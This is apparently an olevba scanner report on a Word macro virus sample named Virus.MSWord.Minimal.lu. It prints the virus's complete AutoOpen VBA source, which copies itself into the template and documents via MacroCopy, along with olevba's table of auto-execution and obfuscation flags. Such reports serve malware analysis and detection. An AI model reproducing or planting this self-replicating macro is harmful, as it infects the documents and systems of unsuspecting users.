olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.lu
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.lu - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.lu - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Smallest MV From NoMercy (99 bytes!) \r\nNJ, Your Q-E not work properly\r\nPyro, Hello... are you there?\r\nGreetz To:\r\n-Cicatrix-NJ-Vecna-VD-AndryC-VictorW-AuroDreph-DarkSide1-DarkChakal-StealthW-NoMercyMembers-StalkerX-Alex:Tw-Queen-Methyl-Pyro-ClanMaster-"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim A$
Dim C$
A$ = WordBasic.[FileName$]() + ":AutoOpen"
C$ = "AutoClose"
On Error Resume Next
WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy C$, A$
WordBasic.MacroCopy A$, C$
WordBasic.FileSave
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

